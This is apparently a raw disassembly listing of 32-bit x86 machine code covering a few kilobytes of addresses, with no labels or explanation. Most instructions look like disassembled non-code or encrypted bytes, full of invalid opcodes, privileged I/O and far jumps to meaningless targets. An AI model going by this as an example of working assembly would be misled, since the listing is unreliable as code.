  40218f:	mov    al,0x4d
  402191:	outs   dx,BYTE PTR ds:[esi]
  402192:	in     al,dx
  402193:	div    BYTE PTR [esi-0x3a]
  402196:	sbb    eax,0x877157f3
  40219b:	sbb    BYTE PTR [eax+edx*4+0x11],0x4
  4021a0:	or     ecx,DWORD PTR [ecx+0x6b]
  4021a3:	mov    ecx,0x37404a3b
  4021a8:	fisttp WORD PTR [esi-0x4e18f8c8]
  4021ae:	fistp  WORD PTR [ecx-0x4b]
  4021b1:	cld    
  4021b2:	sbb    DWORD PTR [ecx+0x5c81dbd2],ebx
  4021b8:	cmp    DWORD PTR [edx],ebx
  4021ba:	dec    esi
  4021bb:	repz and BYTE PTR [ebp-0x13],al
  4021bf:	test   al,0x7c
  4021c1:	jo     0x4021a4
  4021c3:	pop    ebp
  4021c4:	dec    eax
  4021c5:	cmc    
  4021c6:	push   0x39d27e9
  4021cb:	int    0x17
  4021cd:	mov    eax,0xe2cda223
  4021d2:	push   edx
  4021d3:	mov    BYTE PTR [esi+0x51db994c],cl
  4021d9:	xchg   BYTE PTR ds:0x9cb98512,cl
  4021df:	pop    ss
  4021e0:	add    ebp,DWORD PTR [edi]
  4021e2:	push   0x5b
  4021e4:	pop    ebp
  4021e5:	sub    bh,BYTE PTR [eax-0x1d09c179]
  4021eb:	ss fdivrp st(5),st
  4021ee:	adc    DWORD PTR [edx-0x3f],esp
  4021f1:	mov    ebx,0xd8999783
  4021f6:	dec    esi
  4021f7:	(bad)  
  4021f8:	addr16 in al,0x53
  4021fb:	or     al,0x2a
  4021fd:	xchg   esp,eax
  4021fe:	in     al,dx
  4021ff:	clc    
  402200:	addr16 data16 loopne 0x40225e
  402204:	lods   al,BYTE PTR ds:[esi]
  402205:	jae    0x4021cc
  402207:	lods   al,BYTE PTR ds:[si]
  402209:	and    ecx,ecx
  40220b:	pop    esp
  40220c:	stos   DWORD PTR es:[edi],eax
  40220d:	out    dx,al
  40220e:	add    DWORD PTR [esi+0x5b384628],ecx
  402214:	enter  0xd7ce,0x7
  402218:	cld    
  402219:	retf   
  40221a:	lock aas 
  40221c:	jnp    0x4021d5
  40221e:	sub    esi,DWORD PTR [edx-0x80]
  402221:	adc    al,0x8a
  402223:	jae    0x402263
  402225:	xchg   bh,al
  402227:	adc    al,0xce
  402229:	pop    esp
  40222a:	cmp    al,0xf0
  40222c:	cli    
  40222d:	sub    DWORD PTR [ecx-0x5ce2295e],0xffffff87
  402234:	out    dx,al
  402235:	mov    al,0xd
  402237:	nop
  402238:	push   ds
  402239:	xor    edi,DWORD PTR ds:0x208f5d23
  40223f:	outs   dx,DWORD PTR ds:[esi]
  402240:	mov    edx,0x6914ef6f
  402245:	jae    0x40228f
  402247:	ja     0x4021e2
  402249:	dec    ebx
  40224a:	(bad)  
  40224b:	das    
  40224c:	and    eax,0xd149ecc5
  402251:	xchg   esp,eax
  402252:	jmp    0x25a8:0xb7e39cda
  402259:	sbb    al,0xb6
  40225b:	pop    es
  40225c:	aam    0xcb
  40225e:	shr    DWORD PTR [ecx-0x76],cl
  402261:	int3   
  402262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402263:	mov    ds:0xace6d9fa,al
  402268:	fs mov fs:0xba9eb480,eax
  40226f:	add    esi,DWORD PTR [ebp+0x1c5ac097]
  402275:	mov    al,ds:0xbfb64b59
  40227a:	cmp    al,0xb2
  40227c:	push   ecx
  40227d:	sub    BYTE PTR [ebp+0x28],ch
  402280:	sub    esp,DWORD PTR [esp+ebp*4]
  402283:	std    
  402284:	mov    ecx,0x2895a407
  402289:	(bad)  
  40228a:	outs   dx,BYTE PTR ds:[esi]
  40228b:	mov    dl,0xaf
  40228d:	xchg   edi,edx
  40228f:	pop    ds
  402290:	outs   dx,BYTE PTR ds:[esi]
  402291:	sub    eax,0x68455ec8
  402296:	push   esi
  402297:	out    0x89,eax
  402299:	inc    edx
  40229a:	iret   
  40229b:	lea    ecx,[esi+0x55]
  40229e:	push   cs
  40229f:	or     dl,BYTE PTR [eax]
  4022a1:	or     dh,BYTE PTR [edi]
  4022a3:	push   eax
  4022a4:	inc    esp
  4022a5:	jns    0x40223c
  4022a7:	or     eax,0xe4ca86b7
  4022ac:	adc    al,0x17
  4022ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022af:	iret   
  4022b0:	clc    
  4022b1:	neg    bh
  4022b3:	je     0x4022ff
  4022b5:	(bad)  
  4022b6:	sbb    ah,bh
  4022b8:	test   BYTE PTR [eax-0x717ed00e],dl
  4022be:	test   BYTE PTR [edx-0x30],0x37
  4022c2:	pop    ds
  4022c3:	mov    dl,BYTE PTR [ecx+0x39]
  4022c6:	inc    ecx
  4022c7:	mov    bh,0xae
  4022c9:	neg    BYTE PTR [ebx-0x55]
  4022cc:	(bad)  
  4022cd:	mov    ah,0x42
  4022cf:	add    DWORD PTR [esi],edx
  4022d1:	(bad)  
  4022d2:	cwde   
  4022d3:	daa    
  4022d4:	inc    esi
  4022d5:	aam    0xec
  4022d7:	dec    esi
  4022d8:	xchg   edx,eax
  4022d9:	jb     0x402333
  4022db:	loopne 0x402334
  4022dd:	cmp    eax,0x12e93ed3
  4022e2:	stc    
  4022e3:	mov    dl,0xc6
  4022e5:	xchg   ebp,eax
  4022e6:	adc    DWORD PTR [edi],edx
  4022e8:	push   DWORD PTR [edx+0x33]
  4022eb:	xor    eax,DWORD PTR [ebp+0x31ba06b7]
  4022f1:	or     esp,DWORD PTR [ebx]
  4022f3:	lahf   
  4022f4:	stos   DWORD PTR es:[edi],eax
  4022f5:	shl    edi,0x64
  4022f8:	enter  0x4889,0x3b
  4022fc:	sbb    eax,0xc55a5e31
  402301:	jmp    0xbd01:0xb650adbf
  402308:	out    dx,al
  402309:	or     BYTE PTR [esp+ebp*4],al
  40230c:	repz ret 0x108e
  402310:	push   esp
  402311:	jae    0x402381
  402313:	dec    ebx
  402314:	retf   
  402315:	sbb    eax,0xfb2435b7
  40231a:	sbb    al,0xc
  40231c:	push   esp
  40231d:	pop    ebx
  40231e:	lock xchg DWORD PTR [edi+edi*1-0xa],esp
  402323:	dec    eax
  402324:	std    
  402325:	jecxz  0x402336
  402327:	jmp    0x1ee3:0xb10eab35
  40232e:	add    bh,BYTE PTR [esi]
  402330:	pop    edx
  402331:	in     al,dx
  402332:	mov    esp,0x557aecef
  402337:	cmp    eax,0xac5b9fa1
  40233c:	sub    DWORD PTR [eax-0x3d],eax
  40233f:	xor    BYTE PTR [ebp-0x76],dl
  402342:	or     dh,BYTE PTR [eax-0x2a]
  402345:	jmp    0xffee:0xf45324f0
  40234c:	imul   esp,DWORD PTR [edx],0xfa624246
  402352:	xor    ebp,ebp
  402354:	add    DWORD PTR [edi],edx
  402356:	sub    eax,ecx
  402358:	pop    esi
  402359:	mov    ebx,0x7e72e1e2
  40235e:	cwde   
  40235f:	pusha  
  402360:	and    ebp,DWORD PTR [edi]
  402362:	enter  0x68d6,0x87
  402366:	mov    dl,0x87
  402368:	in     eax,dx
  402369:	in     eax,0x57
  40236b:	sbb    al,dh
  40236d:	push   esi
  40236e:	add    ah,dh
  402370:	adc    al,0xcc
  402372:	push   ebx
  402373:	(bad)  
  402374:	data16 sahf 
  402376:	pop    edi
  402377:	ret    0x9616
  40237a:	cld    
  40237b:	adc    BYTE PTR [ebp+0x53],dl
  40237e:	inc    eax
  40237f:	or     eax,0xf350a9f0
  402384:	inc    ecx
  402385:	jb     0x402381
  402387:	pop    ebp
  402388:	xchg   ebx,eax
  402389:	(bad)  
  40238a:	and    DWORD PTR [eax+0x5f2a38b0],edi
  402390:	loope  0x402329
  402392:	mov    edx,0x9d4f009f
  402397:	ror    DWORD PTR [edx],cl
  402399:	and    ecx,ebx
  40239b:	adc    DWORD PTR [edx+0xee9f043],ebx
  4023a1:	dec    eax
  4023a2:	ja     0x4023b4
  4023a4:	push   ss
  4023a5:	call   0x37d07283
  4023aa:	push   ds
  4023ab:	mov    dh,0xfd
  4023ad:	adc    al,0x53
  4023af:	adc    ebp,DWORD PTR [eiz*4+0x65ece5b1]
  4023b6:	pop    ecx
  4023b7:	inc    edx
  4023b8:	xlat   BYTE PTR ds:[ebx]
  4023b9:	inc    ecx
  4023ba:	out    0x13,eax
  4023bc:	aas    
  4023bd:	mov    dl,0x27
  4023bf:	dec    ebx
  4023c0:	push   edx
  4023c1:	dec    ecx
  4023c2:	xor    al,0xb0
  4023c4:	in     al,dx
  4023c5:	or     DWORD PTR ds:0x31c6b054,ebx
  4023cb:	and    dl,dl
  4023cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023ce:	sbb    BYTE PTR [ebx],ch
  4023d0:	mov    ebp,0xd7d55bbc
  4023d5:	dec    esp
  4023d6:	test   al,0x91
  4023d8:	fidivr WORD PTR [ebp-0x7e9a4f92]
  4023de:	fisubr WORD PTR [ebx-0x42]
  4023e1:	xor    dl,BYTE PTR [ebx+0x15]
  4023e4:	scas   eax,DWORD PTR es:[edi]
  4023e5:	adc    eax,0xf138295b
  4023ea:	and    eax,0xd15635e6
  4023ef:	into   
  4023f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023f1:	stos   BYTE PTR es:[edi],al
  4023f2:	xchg   edi,eax
  4023f3:	ret    
  4023f4:	mov    ch,0x10
  4023f6:	push   esi
  4023f7:	test   DWORD PTR [edi-0x28],ecx
  4023fa:	add    bh,BYTE PTR [esi]
  4023fc:	jp     0x402452
  4023fe:	xor    al,0xfe
  402400:	(bad)  
  402401:	push   edx
  402402:	mov    dh,0x99
  402404:	mov    al,ds:0xa1279ee4
  402409:	pushf  
  40240a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40240b:	push   0x6d
  40240d:	adc    esi,DWORD PTR [esi-0x728f752d]
  402413:	jl     0x4023f4
  402415:	imul   eax,DWORD PTR [ecx-0x26],0x1e
  402419:	aaa    
  40241a:	or     BYTE PTR [edi-0x44],ah
  40241d:	ja     0x402417
  40241f:	add    DWORD PTR [ecx-0x5b],esp
  402422:	(bad)  
  402423:	retf   0x802f
  402426:	inc    ebp
  402427:	imul   DWORD PTR [esi+0x46fcb6f9]
  40242d:	dec    esp
  40242e:	clc    
  40242f:	jecxz  0x40249f
  402431:	or     ebp,esi
  402433:	cli    
  402434:	jmp    0x6b3b:0x7efb7a63
  40243b:	jecxz  0x402436
  40243d:	add    ebp,esi
  40243f:	xchg   ecx,eax
  402440:	jp     0x4023d6
  402442:	jae    0x4023f3
  402444:	push   esp
  402445:	xchg   DWORD PTR [esi-0x39],esi
  402448:	scas   eax,DWORD PTR es:[edi]
  402449:	mov    esi,0x59c9134f
  40244e:	mov    ah,0x7
  402450:	push   cs
  402451:	popa   
  402452:	rcr    DWORD PTR [ecx-0x1a],1
  402455:	xchg   esp,eax
  402456:	jmp    0x40240a
  402458:	mov    ss,WORD PTR [ecx-0x6c]
  40245b:	enter  0xb5e3,0x33
  40245f:	xor    eax,0x41907fba
  402464:	adc    esi,DWORD PTR [edi-0x4b]
  402467:	sub    eax,0xe0518ee4
  40246c:	jle    0x40243b
  40246e:	sub    eax,0xe70077bb
  402473:	aad    0x90
  402475:	sub    al,BYTE PTR [esi+edx*2]
  402478:	out    0x45,eax
  40247a:	xlat   BYTE PTR ds:[ebx]
  40247b:	or     DWORD PTR [ecx-0x7c],edi
  40247e:	scas   al,BYTE PTR es:[edi]
  40247f:	pop    ss
  402480:	add    DWORD PTR [edi+0x6e],ebp
  402483:	jmp    esp
  402485:	xor    ebx,DWORD PTR [edx]
  402487:	and    DWORD PTR es:[ecx],ecx
  40248a:	sar    DWORD PTR [esi-0x16],cl
  40248d:	jmp    FWORD PTR [edi+0x4fcb1172]
  402493:	sbb    eax,DWORD PTR [ebx]
  402495:	ret    0xe86b
  402498:	add    BYTE PTR [edx*4-0x62de2c41],dl
  40249f:	cwde   
  4024a0:	or     DWORD PTR [esi],0xc5a15917
  4024a6:	sbb    eax,esp
  4024a8:	pop    edx
  4024a9:	imul   edx,DWORD PTR [edi],0xffffffa7
  4024ac:	and    DWORD PTR [eax+0x6f658672],eax
  4024b2:	add    DWORD PTR ds:[ebp+0x5f666a53],esi
  4024b9:	rol    edx,cl
  4024bb:	loopne 0x40251d
  4024bd:	cwde   
  4024be:	sbb    BYTE PTR [ebx],0x54
  4024c1:	popa   
  4024c2:	daa    
  4024c3:	dec    eax
  4024c4:	std    
  4024c5:	jo     0x4024b3
  4024c7:	test   DWORD PTR [ecx+ebp*2],ebp
  4024ca:	mov    dl,0x33
  4024cc:	fld    QWORD PTR [eax*8-0x55889cd9]
  4024d3:	mov    bh,0xbc
  4024d5:	fs mov eax,0xa4862b65
  4024db:	test   DWORD PTR [edx-0x54],edi
  4024de:	add    ch,dl
  4024e0:	mov    ecx,eax
  4024e2:	test   al,0x6f
  4024e4:	sti    
  4024e5:	sbb    ch,BYTE PTR [eax-0x98d71a9]
  4024eb:	stc    
  4024ec:	fnstcw WORD PTR [ebp+0x10]
  4024ef:	pop    eax
  4024f0:	daa    
  4024f1:	jg     0x40253c
  4024f3:	pop    ecx
  4024f4:	xor    edi,DWORD PTR fs:[eax+0x1bee8d]
  4024fb:	adc    DWORD PTR [edx],ebx
  4024fd:	adc    bl,ch
  4024ff:	jecxz  0x4024e4
  402501:	jb     0x4024b4
  402503:	jl     0x4024ec
  402505:	and    edi,eax
  402507:	out    0xc9,eax
  402509:	push   edi
  40250a:	mov    ebp,0xbdadd62e
  40250f:	rcr    BYTE PTR [edx*8+0x47de4f73],0x40
  402517:	xchg   edi,eax
  402518:	xlat   BYTE PTR ds:[ebx]
  402519:	sub    esi,DWORD PTR [edi]
  40251b:	clc    
  40251c:	sbb    al,0x79
  40251e:	scas   al,BYTE PTR es:[edi]
  40251f:	fstp   DWORD PTR [ebx]
  402521:	xor    ch,ah
  402523:	push   ds
  402524:	mov    ecx,0xec64526a
  402529:	pop    ss
  40252a:	sbb    ebp,ebx
  40252c:	out    dx,al
  40252d:	in     al,0xb2
  40252f:	push   ss
  402530:	cmp    eax,0xca04b1b5
  402535:	jo     0x40257a
  402537:	dec    ebx
  402538:	outs   dx,BYTE PTR ds:[esi]
  402539:	mov    bh,0x91
  40253b:	pop    edi
  40253c:	fucom  st(4)
  40253e:	iret   
  40253f:	mov    eax,ds:0xc8e6bcbf
  402544:	mov    eax,ds:0xe77d05ce
  402549:	adc    eax,0x9b044892
  40254e:	and    al,BYTE PTR ds:0x97e1dff8
  402554:	daa    
  402555:	pop    ecx
  402556:	daa    
  402557:	xor    ebp,0x69
  40255a:	fidivr DWORD PTR [eax+0x3a]
  40255d:	inc    edx
  40255e:	mov    DWORD PTR [eax+edi*2+0x612c4ebb],eax
  402565:	jne    0x40256e
  402567:	sbb    BYTE PTR [ebp-0x58ca8067],cl
  40256d:	aaa    
  40256e:	outs   dx,BYTE PTR ds:[esi]
  40256f:	sbb    edx,DWORD PTR [ebp+edx*4+0x3]
  402573:	mov    ebx,DWORD PTR [edi+0x5dc6146d]
  402579:	fild   QWORD PTR [esp+esi*8]
  40257c:	jne    0x402561
  40257e:	jo     0x4025fc
  402580:	ins    BYTE PTR es:[edi],dx
  402581:	scas   eax,DWORD PTR es:[edi]
  402582:	cmp    BYTE PTR [esi+0x38cdff93],ch
  402588:	sbb    BYTE PTR ds:0x44071660,bl
  40258e:	inc    ebp
  40258f:	fdivr  QWORD PTR [edi]
  402591:	push   cs
  402592:	stc    
  402593:	inc    esp
  402594:	jae    0x4025c3
  402596:	adc    BYTE PTR [edi+0x65c8838c],ch
  40259c:	cmc    
  40259d:	mov    dh,0x68
  40259f:	in     al,0xa0
  4025a1:	add    DWORD PTR [ebp-0x7e519a25],ebx
  4025a7:	sbb    eax,0x32c94f0c
  4025ac:	add    al,0x95
  4025ae:	scas   al,BYTE PTR es:[edi]
  4025af:	ret    0x7491
  4025b2:	clc    
  4025b3:	inc    DWORD PTR [eax-0x565a30f1]
  4025b9:	cdq    
  4025ba:	call   0x4538:0xdf756008
  4025c1:	dec    eax
  4025c2:	sti    
  4025c3:	pop    edi
  4025c4:	in     eax,dx
  4025c5:	cmp    al,0x39
  4025c7:	and    DWORD PTR [esi-0x1ba25eb9],edx
  4025cd:	out    0xd,eax
  4025cf:	sahf   
  4025d0:	mov    ah,0xec
  4025d2:	lods   al,BYTE PTR ds:[esi]
  4025d3:	clc    
  4025d4:	repnz dec edx
  4025d6:	push   edx
  4025d7:	pop    ebp
  4025d8:	adc    ecx,DWORD PTR [ecx+0x34]
  4025db:	loope  0x402625
  4025dd:	add    eax,0x3d0d1dd6
  4025e2:	data16 mov WORD PTR [eax-0x19],gs
  4025e6:	rol    DWORD PTR [edx],0x6
  4025e9:	xchg   ecx,eax
  4025ea:	imul   esp,esp,0x5b
  4025ed:	popa   
  4025ee:	rol    BYTE PTR [edi],1
  4025f0:	inc    ebx
  4025f1:	ror    BYTE PTR [esi+0x36334da7],1
  4025f7:	das    
  4025f8:	xchg   esi,esp
  4025fa:	sbb    eax,0xe2b30f82
  4025ff:	mov    dl,0x64
  402601:	lods   al,BYTE PTR ds:[esi]
  402602:	xchg   edi,eax
  402603:	imul   ebx,DWORD PTR [edx+0x7],0x30
  402607:	in     al,dx
  402608:	imul   BYTE PTR [ebp+0x7cf7adb5]
  40260e:	pop    esp
  40260f:	js     0x4025ca
  402611:	push   0x16
  402613:	mov    ecx,esp
  402615:	dec    edi
  402616:	mov    ds:0x7e8040fd,eax
  40261b:	lds    ebp,FWORD PTR [edi+0x2468e9cf]
  402621:	jmp    0xb923:0x49039dcb
  402628:	sbb    al,0xca
  40262a:	cmp    ebx,DWORD PTR [esi]
  40262c:	dec    eax
  40262d:	jl     0x4026ab
  40262f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402630:	inc    esi
  402631:	mov    ebp,DWORD PTR [ebx-0x4af33f80]
  402637:	mov    eax,0x654fd1ca
  40263c:	jg     0x402628
  40263e:	mov    esp,0x3523a5e9
  402643:	dec    ebx
  402644:	daa    
  402645:	xor    esi,DWORD PTR [eax+0x39]
  402648:	bound  ecx,QWORD PTR [edi-0x5aad0b3c]
  40264e:	jg     0x402698
  402650:	cs ds loope 0x4025f0
  402654:	xchg   ecx,eax
  402655:	out    dx,al
  402656:	test   BYTE PTR [eax],dl
  402658:	sub    al,0xbf
  40265a:	xchg   ebx,eax
  40265b:	mov    gs,WORD PTR ds:0x2dfb40ea
  402661:	jmp    0x30c8ee67
  402666:	xor    BYTE PTR [edx],0xc4
  402669:	jl     0x4026af
  40266b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40266c:	mov    al,0x6e
  40266e:	fisubr WORD PTR [ebx]
  402670:	cmp    dl,cl
  402672:	and    BYTE PTR [edx+0x10fae5af],dh
  402678:	stos   DWORD PTR es:[edi],eax
  402679:	sbb    edi,0xc9e84ce4
  40267f:	sbb    ecx,eax
  402681:	cmp    ah,dh
  402683:	stos   BYTE PTR es:[edi],al
  402684:	mov    bl,0xa7
  402686:	retf   
  402687:	lahf   
  402688:	shl    BYTE PTR [eax-0x40],1
  40268b:	sbb    eax,0x2359fec8
  402690:	mov    edx,0x9717f942
  402695:	push   esi
  402696:	cmp    DWORD PTR [ecx-0x80afacb],edx
  40269c:	mov    ebp,0xe0cd9f29
  4026a1:	mov    ds:0x79a969cf,eax
  4026a6:	add    BYTE PTR [edx],bl
  4026a8:	fnstenv [esi-0x7b]
  4026ab:	inc    eax
  4026ac:	or     al,0xa2
  4026ae:	xor    eax,0x32e00d90
  4026b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026b4:	out    dx,eax
  4026b5:	les    edx,FWORD PTR [esi-0x20]
  4026b8:	outs   dx,DWORD PTR ds:[esi]
  4026b9:	loope  0x4026f5
  4026bb:	pop    esp
  4026bc:	popf   
  4026bd:	dec    dh
  4026bf:	cmc    
  4026c0:	or     eax,0xb0d3ac26
  4026c5:	push   0xfffffffc
  4026c7:	lahf   
  4026c8:	into   
  4026c9:	(bad)  
  4026ca:	dec    ebx
  4026cb:	aaa    
  4026cc:	inc    ebp
  4026cd:	clc    
  4026ce:	xor    bh,BYTE PTR [eax+eax*2-0xc]
  4026d2:	ds mov ?,ebx
  4026d5:	loopne 0x402687
  4026d7:	xchg   esp,eax
  4026d8:	test   DWORD PTR [ebp+edx*4-0x30],ecx
  4026dc:	cmp    dl,ch
  4026de:	mov    bh,0x43
  4026e0:	addr16 dec ebp
  4026e2:	push   cs
  4026e3:	sahf   
  4026e4:	dec    esp
  4026e5:	pop    edi
  4026e6:	out    dx,al
  4026e7:	jmp    0x6a47:0x3a8a4679
  4026ee:	sbb    DWORD PTR [esi],0xffffffce
  4026f1:	xlat   BYTE PTR ds:[ebx]
  4026f2:	dec    eax
  4026f3:	popa   
  4026f4:	sub    al,0xd9
  4026f6:	mov    BYTE PTR [esi-0x2d],ch
  4026f9:	push   cs
  4026fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026fb:	dec    edi
  4026fc:	inc    esi
  4026fd:	mov    dl,0x75
  4026ff:	inc    eax
  402700:	pop    ds
  402701:	inc    edi
  402702:	cdq    
  402703:	mov    ebx,0x52417340
  402708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402709:	push   ds
  40270a:	sbb    ecx,DWORD PTR gs:[ecx+0x2ae72bb9]
  402711:	loop   0x4026b6
  402713:	add    eax,0x222f2e7a
  402718:	pop    eax
  402719:	dec    esp
  40271a:	pop    ebx
  40271b:	imul   DWORD PTR [esi-0x7d27cf65]
  402721:	lods   al,BYTE PTR ds:[esi]
  402722:	lock cwde 
  402724:	adc    DWORD PTR [ecx-0x63],eax
  402727:	mov    cl,0xea
  402729:	jmp    0x402718
  40272b:	scas   eax,DWORD PTR es:[edi]
  40272c:	xor    al,0x44
  40272e:	or     eax,0x94af8867
  402733:	dec    esp
  402734:	mov    esp,0x4ebd8102
  402739:	cmc    
  40273a:	sub    esi,esi
  40273c:	jg     0x40273f
  40273e:	inc    ecx
  40273f:	shr    BYTE PTR [eax+ebx*8+0xa96afd7],1
  402746:	(bad)  
  402747:	aam    0x1a
  402749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40274a:	cmp    BYTE PTR ds:0xc9923cb,dh
  402750:	popa   
  402751:	rcl    BYTE PTR [edx],cl
  402753:	add    DWORD PTR [esi],esi
  402755:	sbb    BYTE PTR [ebp+0x31],dl
  402758:	jmp    0x43d:0x1a118b62
  40275f:	xchg   esi,eax
  402760:	mov    ecx,0x55282bdb
  402765:	aaa    
  402766:	retf   
  402767:	push   0x17
  402769:	and    eax,0x217546d
  40276e:	pop    es
  40276f:	mov    esi,0xfed210f2
  402774:	test   DWORD PTR [esi-0x1f127c1a],ecx
  40277a:	or     eax,0x2bd2f22e
  40277f:	add    DWORD PTR [edx],0xffffff8c
  402782:	pop    esp
  402783:	rcl    DWORD PTR [eax],cl
  402785:	jge    0x40275a
  402787:	sbb    eax,0xb0ababf0
  40278c:	retf   0x5e40
  40278f:	jne    0x40278b
  402791:	and    esp,DWORD PTR [edi-0x78]
  402794:	lds    edi,FWORD PTR [esi+ebp*4+0x61a7625d]
  40279b:	int3   
  40279c:	mov    edi,0x7d916f46
  4027a1:	call   0xefb0bb0d
  4027a6:	cmp    eax,0x4296d5f1
  4027ab:	pop    eax
  4027ac:	jo     0x40278d
  4027ae:	fcom   QWORD PTR [edx]
  4027b0:	xchg   ecx,eax
  4027b1:	test   BYTE PTR [edx-0x3],0xa9
  4027b5:	inc    ebp
  4027b6:	addr16 mov ds:0x50e,al
  4027ba:	fld    DWORD PTR [edi+edi*1]
  4027bd:	ds jecxz 0x40279d
  4027c0:	or     eax,0xae1da964
  4027c5:	adc    al,0xfc
  4027c7:	imul   edx,DWORD PTR [edx-0xc],0x5ae5365a
  4027ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027cf:	fidivr DWORD PTR [ecx+0x48115f4c]
  4027d5:	adc    al,0xbc
  4027d7:	push   0xffffffc4
  4027d9:	mov    dh,0x5c
  4027db:	(bad)  
  4027dc:	call   DWORD PTR [edi+0x7a301724]
  4027e2:	jnp    0x40278c
  4027e4:	icebp  
  4027e5:	xchg   esp,eax
  4027e6:	in     eax,dx
  4027e7:	sbb    ebx,ecx
  4027e9:	jbe    0x4027b0
  4027eb:	aas    
  4027ec:	cmc    
  4027ed:	mov    ebp,0x48f073b0
  4027f2:	outs   dx,DWORD PTR ds:[esi]
  4027f3:	aam    0xf3
  4027f5:	dec    esi
  4027f6:	cmp    esp,ebx
  4027f8:	adc    cl,ch
  4027fa:	scas   al,BYTE PTR es:[edi]
  4027fb:	scas   eax,DWORD PTR es:[edi]
  4027fc:	dec    ebx
  4027fd:	scas   eax,DWORD PTR es:[edi]
  4027fe:	int3   
  4027ff:	inc    edi
  402800:	mov    DWORD PTR [edi-0x2e56d24a],ecx
  402806:	fwait
  402807:	lea    ecx,[esi]
  402809:	scas   eax,DWORD PTR es:[edi]
  40280a:	inc    esp
  40280b:	push   0xffffffc5
  40280d:	pop    ss
  40280e:	mov    ds:0xcf138778,eax
  402813:	xchg   edi,eax
  402814:	scas   al,BYTE PTR es:[edi]
  402815:	mov    ah,0x6a
  402817:	call   0x82479683
  40281c:	pusha  
  40281d:	dec    ecx
  40281e:	aas    
  40281f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402820:	and    eax,0xa95ec1fc
  402825:	cmp    ch,dl
  402827:	sbb    DWORD PTR [esi+0x7ad78444],ebx
  40282d:	or     ah,BYTE PTR [ecx+0x51]
  402830:	out    dx,eax
  402831:	jo     0x402864
  402833:	push   ds
  402834:	cmp    DWORD PTR [edx],eax
  402836:	rol    DWORD PTR [edx],1
  402838:	push   0x2aa5a34e
  40283d:	ss jnp 0x4028ad
  402840:	push   edx
  402841:	add    DWORD PTR [edx+0x79],0x74
  402845:	outs   dx,BYTE PTR ds:[esi]
  402846:	push   edi
  402847:	xchg   ecx,eax
  402848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402849:	call   0x3b37:0xa06eeedc
  402850:	dec    ebp
  402851:	add    eax,0xfec82022
  402856:	add    DWORD PTR [ebx+0x3ee9bc4f],ebp
  40285c:	adc    al,0x68
  40285e:	daa    
  40285f:	jl     0x40287e
  402861:	mov    BYTE PTR [ebp-0x6cef6a85],0xe6
  402868:	ret    0xb93e
  40286b:	mov    ds:0xf7694668,al
  402870:	call   0x1c3c:0xb1c3aa6c
  402877:	enter  0x329c,0x75
  40287b:	repz fdivr QWORD PTR [ebp+0x129d865b]
  402882:	dec    esp
  402883:	imul   ecx,DWORD PTR [edx],0xc1aeba18
  402889:	jnp    0x402818
  40288b:	lods   al,BYTE PTR ds:[esi]
  40288c:	mov    ds,WORD PTR [ebx+0x3ef0aaa8]
  402892:	call   0x262eb556
  402897:	in     al,0x8a
  402899:	lahf   
  40289a:	inc    esi
  40289b:	lods   eax,DWORD PTR ds:[esi]
  40289c:	dec    edx
  40289d:	mov    ah,0x80
  40289f:	cmp    BYTE PTR [edi+eax*4+0x3eb6fa30],dh
  4028a6:	jmp    0x40285e
  4028a8:	jle    0x4028be
  4028aa:	mov    ebx,edx
  4028ac:	adc    ah,dh
  4028ae:	dec    edx
  4028af:	stc    
  4028b0:	movups xmm4,xmm4
  4028b3:	(bad)  
  4028b4:	fild   DWORD PTR [edi]
  4028b6:	test   al,0xab
  4028b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028b9:	sbb    DWORD PTR [edx],ecx
  4028bb:	cmp    edi,DWORD PTR [ecx-0x40951f38]
  4028c1:	shl    DWORD PTR [edx],0x8c
  4028c4:	aam    0x77
  4028c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028c7:	inc    esi
  4028c8:	std    
  4028c9:	mov    cl,bl
  4028cb:	or     al,0x85
  4028cd:	mov    edx,0xb2611e6e
  4028d2:	fst    st(6)
  4028d4:	add    eax,0x5880b9eb
  4028d9:	in     eax,dx
  4028da:	inc    esp
  4028db:	xlat   BYTE PTR ds:[ebx]
  4028dc:	hlt    
  4028dd:	dec    eax
  4028de:	add    BYTE PTR [edx],0x37
  4028e1:	pop    eax
  4028e2:	sbb    edx,DWORD PTR [eax-0x7b]
  4028e5:	adc    eax,0xf2790a42
  4028ea:	and    ch,BYTE PTR [edx-0x9]
  4028ed:	das    
  4028ee:	pop    esp
  4028ef:	dec    edx
  4028f0:	adc    esp,DWORD PTR [ecx+0x651ab79]
  4028f6:	mov    eax,ds:0x2b4ae65f
  4028fb:	js     0x4028b8
  4028fd:	jo     0x4028cf
  4028ff:	sub    edi,DWORD PTR [ebp+0xb8d7ddf]
  402905:	sbb    al,0x4f
  402907:	and    ecx,DWORD PTR [ebp+0x7]
  40290a:	and    BYTE PTR [edi-0x75e9834f],dh
  402910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402911:	inc    edi
  402912:	push   es
  402913:	mov    bl,0xe7
  402915:	lods   al,BYTE PTR ds:[esi]
  402916:	jbe    0x4028e2
  402918:	leave  
  402919:	push   cs
  40291a:	inc    edi
  40291b:	ror    BYTE PTR [ebp-0x335c4bfd],0xed
  402922:	mov    bl,dl
  402924:	xchg   DWORD PTR [ebx+0x5ca58d29],esi
  40292a:	dec    ebp
  40292b:	jb     0x402958
  40292d:	dec    edi
  40292e:	jg     0x402924
  402930:	stos   BYTE PTR es:[edi],al
  402931:	mov    ebp,0x1864d7d4
  402936:	sbb    eax,0xde4e8bcf
  40293b:	pushf  
  40293c:	in     al,0xd8
  40293e:	pop    esp
  40293f:	lods   al,BYTE PTR ds:[esi]
  402940:	pushf  
